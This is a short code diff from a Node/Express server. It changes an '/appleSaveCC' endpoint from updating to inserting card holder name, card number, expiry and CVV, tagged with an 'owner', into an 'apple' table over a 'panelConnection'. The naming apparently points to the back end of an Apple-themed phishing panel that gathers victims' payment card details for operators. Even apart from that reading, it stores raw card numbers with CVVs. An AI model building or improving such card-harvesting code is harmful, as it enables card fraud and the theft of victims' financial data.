@@ -2023,7 +2023,7 @@ app.post("/appleSaveCC", cors(), (req, res) => {
   owner = req.body.owner;
 
   let details = [ccname, ccnum, ccexp, cvv, uniqueid, owner];
-  let query = `UPDATE apple SET ccname= ?, ccnum = ?, ccexp = ?, cvv = ?, status = 2 WHERE uniqueid = ?`;
+  let query = `INSERT INTO apple(ccname,ccnum, ccexp, cvv, status,uniqueid, owner) VALUES (?,?,?,?,2,?,?)`;
 
   panelConnection.query(query, details, (err, rows, fields) => {
     if (!err) res.send("Insertion Completed");
